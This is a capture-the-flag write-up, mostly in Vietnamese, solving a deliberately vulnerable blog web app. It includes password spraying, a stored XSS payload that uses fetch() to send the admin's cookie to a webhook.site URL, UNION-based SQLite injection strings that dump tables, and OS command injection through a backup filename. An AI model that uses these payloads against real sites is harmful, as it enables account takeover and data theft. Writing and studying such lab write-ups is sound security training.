>Tham khảo 1 số nguồn

- Using dirsearch to scan all system:

<img width="1208" height="615" alt="image" src="https://github.com/user-attachments/assets/38e76c97-c720-4287-b36c-9ee6f07b90e7" />

- Now, we look that we have 2 flow: `Needn't to login` and `Need to login`:

+ Needn't to login:

= Ở trang chủ, chúng ta thấy có 3 chức năng là Blogs, Register, Login.

= Trong chức năng blog (http://103.97.125.56:30983/blog), thấy có toàn bài viết có private là No, Chú ý 1 người dùng là Harry có gmail là harry@cookiehanhoan.org

Ngoài ra blog còn có chức năng `Create Blog`.

= Ở login (http://103.97.125.56:30983/login), thấy có 2 trường là email và password.

= Ở register có 3 trường Name, Email, Password (http://103.97.125.56:30983/register)

=> Nguy cơ có thể đọc được private blog khi đăng nhập không?

=> Login có thể bị SQLi, authen

=> Register có thể bị SQLi, Stored XSS.

+ Need to login:

= Sau khi đăng nhập, được đưa tới trang (http://103.97.125.56:30983/profile). Ở đây có 6 chức năng: Home, Blogs, Feedback, Update Profile, Change Password, Logout.

= Các chức năng: Home, Blogs chúng ta đã làm quen trước khi đăng nhập => không có gì thay đổi so với trước khi đăng nhập.

= Chức năng Feedback (http://103.97.125.56:30983/feedback), chú ý `Admin will read your feedback every 3 minutes. They only view feedback in an unread state.` Nghĩa là admin chỉ xem feedback ở trạng thái `unread state`. Có trường message
<img width="762" height="847" alt="image" src="https://github.com/user-attachments/assets/b8c960e0-69da-4373-81d3-36d70703d22d" />

=> Có thể bị SQLi, StoreXSS.

= Chức năng Update Profile (http://103.97.125.56:30983/change_profile), thấy trường email là không thể thay đổi,các trường còn lại có thể thay đổi 
<img width="741" height="762" alt="image" src="https://github.com/user-attachments/assets/424bd510-63bf-455b-9b98-ecb892a28b82" />

=> Có thể bị SQLi, StoreXSS, Mass Assignment (1 lỗ hổng xảy ra khi qtv không giới hạn rõ ràng những trường nào được phép update)

= Chức năng Change Password (http://103.97.125.56:30983/change_password), thấy rõ lỗi khi không có trường `Current Password` 

=> Broken Access Control, SQLi. Ở đây không có StoreXSS vì thông thường mật khẩu khi nhập vào nó là những cái ..., được lưu dưới dạng hash trong DB => Không có chỗ render ra => Không có StoreXSS.

= Theo như dirsearch, còn 2 chức năng là /backup và /search. Truy cập thì thấy lỗi:
<img width="694" height="172" alt="image" src="https://github.com/user-attachments/assets/d6d0b2a7-bcbd-4cfb-babb-da28db99f149" />
<img width="680" height="209" alt="image" src="https://github.com/user-attachments/assets/4a2f2141-e32f-42a5-a0b5-d127b6ee2c98" />

=> Chỉ có những tài khoản có quyền mới có thể xem được.

= Chức năng `Create Blog` thấy có 2 trường là Title, Content và có 1 trường chọn tick `Make this post private`

=> SQLi, StoreXSS

*Solution:*

***Flag1: Bạn sẽ nhận được FLAG nếu đăng nhập thành công vào tài khoản Harry.***

-> `Account TakeOver (ATO)` : xảy ra do Dùng mật khẩu mặc định/ yếu, Brute force login, SQLi bypass login, Lỗi session management (cookie có thể đoán được)

- Bài này thấy trang Register và Login không có dấu hiệu của SQLi, StoreXSS nên có thể là Spray Directory Attack. Dùng weakpassword mà mọi người hay dùng để brute force thì thấy password là `iloveyou` và gmail là `harry@cookiehanhoan.org` thì thấy đăng nhập thành công.

***Flag2: Bạn sẽ nhận được FLAG nếu đăng nhập thành công vào tài khoản Admin.***

-> `Account TakeOver (ATO)` : xảy ra do Dùng mật khẩu mặc định/ yếu, Brute force login, SQLi bypass login, Lỗi session management (cookie có thể đoán được)

= Bài này có 2 cách để làm:

1. Tìm được email và password của admin

2. Lấy được cookie của admin.

Cách khả dụng là Lấy được cookie của admin bằng cách lợi dụng cái feedback admin sẽ đọc sau mỗi 3 phút. Để đánh cắp được cookie thì sử dụng StoreXSS.

- Sử dụng `<img src/onerror=alert(1)>` (img là thẻ up ảnh, thường src là 1 đường dẫn ảnh nhưng ở đây đường dẫn không hợp lệ => có lỗi, mỗi khi có onerror thì sẽ hiện alert(1)). Sau khi chèn vậy, chưa thấy có gì thay đổi nhưng khi ấn vào `Inspect` và vào chỗ `/feedback/2` , nhấp vào thấy "nổ".

<img width="547" height="322" alt="image" src="https://github.com/user-attachments/assets/2e40471b-eb41-4b40-ac70-a3939e7cf370" />
<img width="626" height="239" alt="image" src="https://github.com/user-attachments/assets/272d8262-89ae-4db2-bbd3-5e14198af5e0" />

=> Xác định được `Attack surface` (chỗ nhập dữ liệu được render lại ra trình duyệt) và thấy nó không bị filter (mã hóa ..) 

=> Tồn tại StoreXSS. Bây giờ phải viết payload sao cho mỗi lần up feedback, admin đọc được chúng ta đều lấy được feedback. Chúng ta sẽ dùng `Fetch API` để mỗi lần admin nhấp vào, nó sẽ tự gửi request từ trình duyệt nạn nhân đến 1 URL bên ngoài (ở đay mình sẽ cố gắng dùng `Webhook.site`)

```
<script>fetch(`https://webhook.site/32015b98-7f6e-46ec-a2d4-b27f59e2a33e?cookie=${document.cookie}`)</script>
```
= Nó trả về session:

<img width="1917" height="915" alt="image" src="https://github.com/user-attachments/assets/649a849f-72e0-4dc9-9a70-59871eada71c" />

= Thay giá trị session này vào cookie, đăng nhập được vào tài khoản admin và có flag:

<img width="750" height="637" alt="image" src="https://github.com/user-attachments/assets/7dbf2ff6-29c1-404b-8bd5-c8ddc1f5301c" />

***Flag3: FLAG được ẩn trong một bài viết của admin với trạng thái là private.***

= Xem tất cả các bài viết của Admin có Private = Yes ta thấy có flag:
<img width="1074" height="403" alt="image" src="https://github.com/user-attachments/assets/cd38c1d8-9f76-4cf4-84d2-0175ca2d3a6f" />

***Flag4: FLAG được ẩn trong một bảng của cơ sở dữ liệu.***

= Vì đề bài nói là được ẩn trong 1 bảng của CSDL => SQLi

= Sau khi vào tài khoản admin, có thêm chức năng "Search" mà tài khoản thường không xem được. 

= Thử test với 'flag':

<img width="835" height="459" alt="image" src="https://github.com/user-attachments/assets/e5c8e600-32d4-4b96-808e-4e2e7215be86" />

= flag":

<img width="798" height="425" alt="image" src="https://github.com/user-attachments/assets/f1c3fcf8-d7b8-497b-bf0c-9a31eda1fc52" />

= Nhưng khi test với flag' thì hiện lỗi nhưng chưa khẳng định được gì, test tiếp:
<img width="956" height="208" alt="image" src="https://github.com/user-attachments/assets/6e9b5aa5-0b73-469f-b062-805683fa6535" />

>Mục đích của dấu ' thường là : admin'-- thì khi query sẽ trở thành 'admin'--'

= Khi nhập flag'-- khi query sẽ thành 'flag'--' . Vì sau -- mọi thứ sẽ được coi là comment nên hệ thống sẽ hiểu là flag và xuất hiện `Secure FLag`:
<img width="774" height="445" alt="image" src="https://github.com/user-attachments/assets/309731d7-4a8b-4704-a71f-e11ca9465baa" />

= Khi nhập tiếp flag'-- - mà hệ thống vẫn hiện `Secure Flag` chứng tỏ bị nhiễm SQLi. 

=> Đầu tiên, xác định số cột và dùng hệ quản trị csdl gì:

`flag' order by <number>-- -`

= Thay số lần lượt từ 1 vào đến khi nào gặp lỗi thì sẽ có n-1 cột.

<img width="955" height="212" alt="image" src="https://github.com/user-attachments/assets/d446e544-0323-42f8-b70f-44011a5c82ce" />

=> `Vậy có 3 cột. và dùng SQLite`

=> Tìm các cột được hiển thị ra ngoài:

<img width="712" height="474" alt="image" src="https://github.com/user-attachments/assets/24894035-769f-42f8-8eb4-7b7667f339f5" />

=> Cột số 2 sẽ hiển thị cái mình muốn. Vây giờ lấy tên các bảng để xác định xem flag ở chỗ nào

```
flag' union select 1,group_concat(tbl_name),3 FROM sqlite_master WHERE  type='table' and tbl_name NOT like 'sqlite_%'-- -
```

<img width="725" height="403" alt="image" src="https://github.com/user-attachments/assets/143396d2-c4ba-4535-aec3-585b1c0e3fc0" />

=> Vậy có tên các bảng: user, flag, blog, feedback.

=> Xem bảng flag có những cột gì:

<img width="845" height="923" alt="image" src="https://github.com/user-attachments/assets/b28c1f23-b6b8-477a-9401-3b4dccf11be0" />

=> Thấy trong bảng flag, có cột `secret_flag`, giờ lấy flag:

<img width="745" height="474" alt="image" src="https://github.com/user-attachments/assets/19cb8eef-f94c-4ba8-ab11-a1f4c2936922" />

***Flag K01 Start Me Now: Hãy đọc file /flag.txt bên trong hệ thống.***

>Các hướng làm bài này: RCE, Command Injection, SQL để đọc file.

= Đi từ đơn giản nhất: OS Command Injection. Bây giờ còn chức năng /backup là chưa dùng.

<img width="667" height="531" alt="image" src="https://github.com/user-attachments/assets/0c853ff5-8384-46df-a1b7-8985ed960ee7" />

= Chức năng backup lại dữ liệu và khi thêm mình backup bất kỳ file gì thì nó cũng .db
<img width="694" height="522" alt="image" src="https://github.com/user-attachments/assets/6e61f8c2-0f88-4316-961f-7a78a5cc9919" />

= Vì mình có thể nhập tên file backup bất kỳ -> Nó là unstructed data.

= Khi $(echo a) hoặc `echo a` nó in ra a.db => Thực hiện câu lệnh của HDH => OS Command Injection.

<img width="668" height="531" alt="image" src="https://github.com/user-attachments/assets/7ce7dce5-cf91-4327-b839-25099eb4d39d" />

<img width="820" height="625" alt="image" src="https://github.com/user-attachments/assets/ba941850-af3c-415b-bf43-01646352baf4" />

= Thế là `Done Final1`












   

